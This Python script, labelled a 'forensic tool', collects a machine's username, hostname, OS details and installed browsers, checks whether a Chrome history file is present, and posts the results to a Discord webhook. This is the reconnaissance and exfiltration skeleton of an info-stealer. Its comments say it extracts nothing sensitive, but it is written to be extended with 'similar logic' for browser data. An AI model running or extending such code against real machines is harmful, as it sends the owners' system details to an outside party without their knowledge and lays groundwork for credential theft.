import os
import platform
import json
import socket
import getpass
import psutil
import requests
import subprocess
from datetime import datetime

# Replace this with ENV read if you want to store webhook in the Pi
from dotenv import load_dotenv
load_dotenv()
#webhook = os.getenv("DISCORD_WEBHOOK_URL")
DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')

def get_user_info():
    return {
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor()
    }

def list_installed_browsers():
    browsers = []
    if platform.system() == 'Windows':
        browser_paths = {
            "Chrome": os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"),
            "Firefox": os.path.expandvars(r"%ProgramFiles%\Mozilla Firefox\firefox.exe"),
            "Edge": os.path.expandvars(r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe")
        }
    else:  # Linux
        browser_paths = {
            "Chrome": "/usr/bin/google-chrome",
            "Firefox": "/usr/bin/firefox",
            "Brave": "/usr/bin/brave-browser"
        }

    for name, path in browser_paths.items():
        if os.path.exists(path):
            browsers.append(name)
    return browsers

def get_browser_data():
    # ⚠️ Only demonstrate safe collection: e.g. bookmarks/history if not encrypted
    data = {}

    if platform.system() == 'Windows':
        user_path = os.getenv("USERPROFILE")
    else:
        user_path = os.getenv("HOME")

    chrome_history_path = os.path.join(user_path, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")

    if os.path.exists(chrome_history_path):
        data["chrome"] = "Chrome history exists (not extracted here for safety)"
    else:
        data["chrome"] = "No history found or unsupported system"

    # Add similar safe logic for other browsers

    return data

def send_to_discord(info):
    headers = {
        "Content-Type": "application/json"
    }

    message = {
        "username": "ForensicTool",
        "content": "**Cyber Forensic Summary**",
        "embeds": [
            {
                "title": "System Info",
                "description": "```json\n" + json.dumps(info['user_info'], indent=2) + "\n```",
                "color": 5814783
            },
            {
                "title": "Browsers Installed",
                "description": "```" + "\n".join(info['browsers']) + "```",
                "color": 3447003
            },
            {
                "title": "Browser Data Info",
                "description": "```json\n" + json.dumps(info['browser_data'], indent=2) + "\n```",
                "color": 16776960
            }
        ]
    }

    response = requests.post(DISCORD_WEBHOOK_URL, headers=headers, data=json.dumps(message))
    print("Discord webhook sent:", response.status_code)

def main():
    all_info = {
        "user_info": get_user_info(),
        "browsers": list_installed_browsers(),
        "browser_data": get_browser_data()
    }

    send_to_discord(all_info)

if __name__ == "__main__":
    main()